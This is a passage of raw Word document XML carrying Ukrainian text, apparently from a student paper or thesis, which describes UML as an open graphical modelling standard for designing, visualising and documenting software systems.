        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>графічного</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>опису</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> для </w:t>
      </w:r>
      <w:hyperlink r:id="rId33" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>об'єктного</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>моделювання</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> в </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>області</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId34" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>розробки</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>програмного</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>забезпечення</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, для </w:t>
      </w:r>
      <w:hyperlink r:id="rId35" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>моделювання</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId36" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>бізнес-процесів</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId37" w:history="1">
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t xml:space="preserve">системного </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>проектування</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> і </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>відображення</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId38" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>організаційних</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t xml:space="preserve"> структур</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>UML</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> є </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>мовою</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> широкого </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>профілю</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>це</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:hyperlink r:id="rId39" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>відкритий</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t xml:space="preserve"> стандарт</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Який</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>використовує</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>графічні</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>позначення</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> для </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>створення</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId40" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>абстрактної</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>моделі</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId41" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>системи</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Званої</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>UML</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>моделлю</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>UML</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>був</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>створений</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> для </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>визначення</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>візуалізації</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>проектування</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>документування</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, в основному, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>програмних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> систем. </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>UML</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> не є </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>мовою</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>програмування</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, але на </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>підставі</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>UML</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">-моделей </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>можлива</w:t>
      </w:r>
      <w:hyperlink r:id="rId42" w:history="1">
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>генерація</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t xml:space="preserve"> коду</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="__RefHeading___Toc10641138"/>
      <w:bookmarkStart w:id="17" w:name="_Toc10727435"/>
      <w:bookmarkEnd w:id="16"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">2.2.1 </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
